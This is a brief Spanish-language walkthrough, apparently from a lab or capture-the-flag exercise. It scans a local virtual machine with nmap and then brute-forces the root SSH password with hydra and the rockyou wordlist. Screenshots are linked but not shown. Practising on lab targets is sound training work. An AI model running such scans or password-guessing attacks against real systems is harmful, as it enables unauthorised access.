```
nmap -p- -open -sS -sC -sV -Pn 10.0.2.16 -vvv
```

el resultado es :
![[Pasted image 20240531082833.png]]
vemos que hay en el puerto 80 
![[Pasted image 20240531082946.png]]
al no tener de donde tirar podemos usar hydra.
```
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.0.2.16 ssh

```
![[Pasted image 20240531090510.png]]
ahora solo resta conectarnos via SSH
